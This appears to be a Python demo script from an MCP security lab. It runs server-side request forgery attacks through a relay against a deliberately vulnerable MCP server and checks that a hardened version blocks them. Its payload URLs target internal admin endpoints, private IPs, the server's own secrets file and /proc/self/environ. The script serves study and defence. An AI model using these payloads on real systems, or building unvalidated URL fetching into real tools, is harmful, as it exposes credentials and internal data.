#!/usr/bin/env python3
"""
SSRF (Server-Side Request Forgery) Attack Demonstrations

This script demonstrates SSRF attack techniques against the vulnerable MCP server.

SSRF Attack: The MCP is tricked into fetching a URL that points to internal-only data,
letting attackers read secret information the server can access but users cannot.

Vulnerability: The MCP server has an http_get tool that fetches URLs without validation,
allowing attackers to request internal resources (localhost, internal IPs, metadata services)
that they cannot access directly.

Attack Flow:
1. Attacker sends request to relay service with internal URL
2. Relay service forwards URL to MCP server
3. MCP server fetches the internal URL (which attacker cannot access)
4. MCP returns the internal data to relay service
5. Relay service returns data to attacker
"""

import asyncio
import sys
import json
import requests
import subprocess
import time
import signal
import os
from pathlib import Path

# Add project root to path
project_root = Path(__file__).parent.parent.parent
sys.path.insert(0, str(project_root))

from mcp import ClientSession, StdioServerParameters
from mcp.client.stdio import stdio_client

# Track background processes for cleanup
background_processes = []

# Track secrets obtained during attacks for summary
secrets_obtained = []


# SSRF Attack Scenarios
# Demonstrates BOTH scenarios:
# Scenario 1: Secrets in other internal services (port 8080)
# Scenario 2: Secrets in the MCP server itself (config files)

SSRF_ATTACK_SCENARIOS_SCENARIO_1 = [
    {
        "name": "SSRF - Internal Admin Config (Scenario 1)",
        "description": "Access internal admin configuration with secrets from separate service",
        "url": "http://127.0.0.1:8080/admin/config",
        "expected": "MCP can access localhost:8080 (internal service) that attacker cannot",
        "secrets": "Admin passwords, database URLs, JWT secrets, encryption keys",
        "scenario": 1
    },
    {
        "name": "SSRF - Internal API Keys (Scenario 1)",
        "description": "Access internal API keys and secrets from separate service",
        "url": "http://192.168.1.100:8080/internal/keys",
        "expected": "MCP can access internal keys service that attacker cannot",
        "secrets": "AWS keys, GitHub tokens, Stripe keys, MongoDB connection strings",
        "scenario": 1
    },
    {
        "name": "SSRF - Instance Metadata (Scenario 1)",
        "description": "Access cloud instance metadata from separate service",
        "url": "http://10.0.0.50:8080/metadata/instance",
        "expected": "MCP can access metadata service that attacker cannot",
        "secrets": "Instance IDs, IAM roles, security groups, user data",
        "scenario": 1
    }
]

SSRF_ATTACK_SCENARIOS_SCENARIO_2 = [
    {
        "name": "SSRF - MCP Server Secrets File (Scenario 2)",
        "description": "Access MCP server's own secrets config file via file:// protocol",
        "url": "file:///cis_project/mcp_security_project/server/mcp_secrets.json",
        "expected": "MCP can access its own config file that contains secrets",
        "secrets": "Database passwords, API keys, JWT secrets, encryption keys stored in MCP server",
        "scenario": 2
    },
    {
        "name": "SSRF - MCP Server Secrets (Relative Path) (Scenario 2)",
        "description": "Access MCP server secrets using relative path",
        "url": "file://./server/mcp_secrets.json",
        "expected": "MCP can access its own config file using relative paths",
        "secrets": "All secrets stored in the MCP server's config file",
        "scenario": 2
    },
    {
        "name": "SSRF - Environment Variables (Scenario 2)",
        "description": "Attempt to access environment variables via /proc/self/environ",
        "url": "file:///proc/self/environ",
        "expected": "MCP might expose environment variables containing secrets",
        "secrets": "Environment variables with API keys, passwords, tokens",
        "scenario": 2
    }
]

# Combine both scenarios
SSRF_ATTACK_SCENARIOS = SSRF_ATTACK_SCENARIOS_SCENARIO_1 + SSRF_ATTACK_SCENARIOS_SCENARIO_2


class MCPClientWrapper:
    """Wrapper to make MCP client work for direct tool calls"""
    
    def __init__(self):
        self.session = None
        self.server_params = None
        
    async def initialize(self):
        """Initialize connection to MCP server"""
        project_root = Path(__file__).parent.parent.parent
        
        self.server_params = StdioServerParameters(
            command="python",
            args=["-m", "server.vulnerable_server"],
            env=None,
            cwd=str(project_root)
        )
        
        self.stdio_context = stdio_client(self.server_params)
        self.stdio_transport = await self.stdio_context.__aenter__()
        read, write = self.stdio_transport
        
        self.session_context = ClientSession(read, write)
        self.session = await self.session_context.__aenter__()
        await self.session.initialize()
    
    async def call_tool(self, tool_name: str, arguments: dict) -> dict:
        """Call a tool on the MCP server"""
        if not self.session:
            raise RuntimeError("MCP client not initialized")
            
        try:
            result = await self.session.call_tool(tool_name, arguments)
            if result.content:
                content_text = result.content[0].text if result.content else ""
                try:
                    return json.loads(content_text)
                except json.JSONDecodeError:
                    return {"raw": content_text}
            return {"status": "success"}
        except Exception as e:
            return {"error": str(e)}
    
    async def cleanup(self):
        """Clean up connections"""
        if hasattr(self, 'session_context') and self.session_context:
            await self.session_context.__aexit__(None, None, None)
        if hasattr(self, 'stdio_context') and self.stdio_context:
            await self.stdio_context.__aexit__(None, None, None)


async def create_mcp_client():
    """Create and initialize MCP client"""
    client = MCPClientWrapper()
    await client.initialize()
    return client




async def run_ssrf_attack_via_relay(attack_scenario, attack_number=None):
    """Run SSRF attack via relay service - test both vulnerable and secure"""
    
    url = attack_scenario['url']
    description = attack_scenario['description']
    
    # Remove "(Scenario 1)" or "(Scenario 2)" from name
    attack_name = attack_scenario['name'].replace(" (Scenario 1)", "").replace(" (Scenario 2)", "")
    
    if attack_number:
        print(f"\nAttack #{attack_number}: {attack_name}")
    else:
        print(f"\nAttack: {attack_name}")
    print(f"  What it does: {description}")
    print(f"  Target URL: {url}")
    
    vulnerable_succeeded = False
    secure_blocked = False
    secure_blocked_reason = None
    
    # Test vulnerable relay service
    vulnerable_relay_url = f"http://127.0.0.1:8001/fetch?url={url}"
    try:
        response = requests.get(vulnerable_relay_url, timeout=30)
        result = response.json()
        if result.get("status") == "success":
            vulnerable_succeeded = True
            secrets_obtained.append({
                "attack": attack_scenario['name'],
                "url": url,
                "scenario": attack_scenario.get('scenario', '?'),
                "secrets": attack_scenario.get('secrets', 'N/A'),
                "via_relay": True
            })
    except:
        pass
    
    # Test secure relay service
    secure_relay_url = f"http://127.0.0.1:8005/fetch?url={url}"
    try:
        response = requests.get(secure_relay_url, timeout=30)
        result = response.json()
        if result.get("status") == "blocked":
            secure_blocked = True
            blocked_reasons = result.get("blocked_reasons", [])
            if blocked_reasons:
                # Extract the dangerous part from blocked reasons and make it descriptive
                reason = blocked_reasons[0]
                
                # Parse URL to get the IP/hostname
                from urllib.parse import urlparse
                parsed = urlparse(url)
                host = parsed.hostname or ""
                
                # Create descriptive blocked reason
                if "Blocked hostname:" in reason:
                    if host in ["127.0.0.1", "localhost"]:
                        secure_blocked_reason = f"localhost address ({host}) is in private range"
                    else:
                        secure_blocked_reason = f"hostname {host} is blocked"
                elif "Blocked protocol:" in reason:
                    protocol = parsed.scheme
                    secure_blocked_reason = f"protocol {protocol}:// is blocked"
                elif "Private IP" in reason or "private" in reason.lower():
                    if host.startswith("192.168."):
                        secure_blocked_reason = f"IP {host} is in private range (192.168.0.0/16)"
                    elif host.startswith("10."):
                        secure_blocked_reason = f"IP {host} is in private range (10.0.0.0/8)"
                    elif host.startswith("172."):
                        secure_blocked_reason = f"IP {host} is in private range (172.16.0.0/12)"
                    elif host in ["127.0.0.1", "localhost"]:
                        secure_blocked_reason = f"IP {host} is localhost/loopback address"
                    else:
                        secure_blocked_reason = f"IP {host} is in private range"
                else:
                    secure_blocked_reason = reason
    except:
        pass
    
    # Display results
    print(f"  Result:")
    if vulnerable_succeeded:
        print(f"    Vulnerable MCP: Succeeded")
    else:
        print(f"    Vulnerable MCP: Failed")
    
    if secure_blocked and secure_blocked_reason:
        print(f"    Secure MCP: Blocked - {secure_blocked_reason}")
    else:
        print(f"    Secure MCP: Failed")
    
    await asyncio.sleep(0.5)


def check_service_running(port: int) -> bool:
    """Check if a service is running on the given port"""
    try:
        response = requests.get(f"http://127.0.0.1:{port}/", timeout=1)
        return response.status_code == 200
    except:
        return False


def start_service(name: str, module: str, port: int) -> subprocess.Popen:
    """Start a service in the background"""
    try:
        process = subprocess.Popen(
            [sys.executable, "-m", module],
            cwd=str(project_root),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True
        )
        # Wait for service to start (check multiple times)
        max_attempts = 10
        for attempt in range(max_attempts):
            time.sleep(0.5)
            if check_service_running(port):
                return process
            if process.poll() is not None:
                # Process died
                return None
        
        return process
    except Exception as e:
        return None


def cleanup_processes():
    """Clean up background processes"""
    if not background_processes:
        return
    
    for process in background_processes:
        if process and process.poll() is None:
            try:
                process.terminate()
                process.wait(timeout=5)
            except subprocess.TimeoutExpired:
                try:
                    process.kill()
                except:
                    pass
            except:
                pass
    
    # Clear the list
    background_processes.clear()


def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    cleanup_processes()
    sys.exit(0)


async def run_all_ssrf_attacks():
    """Run all SSRF attack demonstrations"""
    
    # Register signal handler for cleanup
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    print("\n" + "="*80)
    print("  SSRF (Server-Side Request Forgery) ATTACK DEMONSTRATIONS")
    print("="*80 + "\n")
    
    # Check and start internal target service (Scenario 1)
    internal_service_started = False
    if not check_service_running(8080):
        process = start_service("Internal Target Service", "external_service.internal_target_service", 8080)
        if process:
            background_processes.append(process)
            internal_service_started = True
    
    # Check and start vulnerable relay service
    vulnerable_relay_started = False
    if not check_service_running(8001):
        process = start_service("Vulnerable SSRF Relay Service", "external_service.ssrf_service", 8001)
        if process:
            background_processes.append(process)
            vulnerable_relay_started = True
    
    # Check and start secure relay service
    secure_relay_started = False
    if not check_service_running(8005):
        process = start_service("Secure SSRF Relay Service", "external_service.secure_ssrf_relay_service", 8005)
        if process:
            background_processes.append(process)
            secure_relay_started = True
    
    # Give services a moment to fully initialize
    if internal_service_started or vulnerable_relay_started or secure_relay_started:
        time.sleep(2)
    
    # Attack Type 1: Attacking Internal Services (Scenario 1)
    print("ATTACK TYPE 1: Attacking Internal Services")
    print("="*80)
    print("\nAttacks targeting internal services on private networks.\n")
    
    for i, attack_scenario in enumerate(SSRF_ATTACK_SCENARIOS_SCENARIO_1, 1):
        await run_ssrf_attack_via_relay(attack_scenario, attack_number=i)
    
    # Attack Type 2: Attacking MCP's Own Secrets (Scenario 2)
    print("\n\n" + "="*80)
    print("ATTACK TYPE 2: Attacking MCP's Own Secrets")
    print("="*80)
    print("\nAttacks targeting the MCP server's own files and secrets.\n")
    
    for i, attack_scenario in enumerate(SSRF_ATTACK_SCENARIOS_SCENARIO_2, 1):
        await run_ssrf_attack_via_relay(attack_scenario, attack_number=i)
    
    print("\n" + "="*80)
    print("SSRF ATTACK DEMONSTRATIONS COMPLETE")
    print("="*80 + "\n")
    
    # Cleanup background processes
    cleanup_processes()


if __name__ == "__main__":
    try:
        asyncio.run(run_all_ssrf_attacks())
    except KeyboardInterrupt:
        cleanup_processes()
        sys.exit(0)
    except Exception as e:
        cleanup_processes()
        sys.exit(1)

